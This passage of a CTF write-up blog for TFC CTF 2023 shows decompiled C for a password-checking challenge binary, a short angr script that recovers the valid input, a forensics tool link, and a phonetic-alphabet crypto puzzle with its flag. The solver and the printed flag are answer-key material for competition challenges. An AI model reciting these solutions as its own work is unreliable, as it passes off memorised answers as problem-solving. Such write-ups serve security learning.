<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h3><h5 id="main-func-4"><a href="#main-func-4" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> extraout_AL;</span><br><span class="line">  <span class="type">char</span> *pcVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  uint counter;</span><br><span class="line">  <span class="type">char</span> user_input [<span class="number">40</span>];</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  set_flag();</span><br><span class="line">  fgets(user_input,<span class="number">27</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  pcVar1 = user_input;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password entered: %s\n&quot;</span>);</span><br><span class="line">  counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    encrypt((<span class="type">char</span> *)(ulong)(uint)(<span class="type">int</span>)user_input[counter],(<span class="type">int</span>)pcVar1);</span><br><span class="line">    <span class="keyword">if</span> (extraout_AL != flag[(ulong)counter * <span class="number">26</span>]) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong password&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    counter = increment();</span><br><span class="line">  &#125; <span class="keyword">while</span> (counter != <span class="number">25</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct password&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import re </span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./pass&quot;</span>, auto_load_libs=False)</span><br><span class="line"></span><br><span class="line">@project.hook(<span class="number">0x4019b3</span>)  # Target address</span><br><span class="line">def print_flag(state):</span><br><span class="line">    print(<span class="string">&quot;VALID INPUT:&quot;</span>, state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h3><h3 id="down-bad"><a href="#down-bad" class="headerlink" title="down bad"></a>down bad</h3><h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p><a target="_blank" rel="noopener" href="https://fotoforensics.com/">https://fotoforensics.com/</a></p>
<h3 id="Cry"><a href="#Cry" class="headerlink" title="Cry"></a>Cry</h3><h3 id="mayday"><a href="#mayday" class="headerlink" title="mayday"></a>mayday</h3><p>description</p>
<blockquote>
<p>We are sinking! The nearest ship got our SOS call, but they replied in pure gobbledygook! Are ye savvy enough to decode the message, or will we be sleepin’ with the fish tonight All hands on deck!</p>
<p>Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven</p>
<p>Flag format: TFCCTF{RESUL7-H3R3}</p>
</blockquote>
<p><img src="/imgs/post6/cry/cry1.png" alt="cry1.png"></p>
<p>Flag : TFCCTF{WH4T-AR3-YOU-S1NKING-4B0U7}</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archive">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Diary"><span class="toc-number">1.1.</span> <span class="toc-text">Diary</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vuln-func"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">vuln func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#helper-func"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">helper func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shello-world"><span class="toc-number">1.2.</span> <span class="toc-text">shello-world</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vuln-func-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">vuln func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-ROP"><span class="toc-number">1.3.</span> <span class="toc-text">Easy ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-number">1.4.</span> <span class="toc-text">random</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-1"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwngate"><span class="toc-number">1.5.</span> <span class="toc-text">pwngate</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-2"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#menu-func"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">menu func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#divergence-meter-func"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">divergence_meter func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#current-leap-func"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">current_leap func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#timeleap-func"><span class="toc-number">1.5.0.5.</span> <span class="toc-text">timeleap func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sanity-func"><span class="toc-number">1.5.0.6.</span> <span class="toc-text">sanity func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#okabe-func"><span class="toc-number">1.5.0.7.</span> <span class="toc-text">okabe func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#notes"><span class="toc-number">1.6.</span> <span class="toc-text">notes</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-3"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pass"><span class="toc-number">2.1.</span> <span class="toc-text">pass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-4"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve"><span class="toc-number">2.1.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic"><span class="toc-number">2.2.</span> <span class="toc-text">Forensic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#down-bad"><span class="toc-number">2.3.</span> <span class="toc-text">down bad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cry"><span class="toc-number">2.4.</span> <span class="toc-text">Cry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mayday"><span class="toc-number">2.5.</span> <span class="toc-text">mayday</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&text=CTF WriteUp: TFC CTF 2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&is_video=false&description=CTF WriteUp: TFC CTF 2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF WriteUp: TFC CTF 2023&body=Check out this article: https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&name=CTF WriteUp: TFC CTF 2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&t=CTF WriteUp: TFC CTF 2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    Durgesh
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archive">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
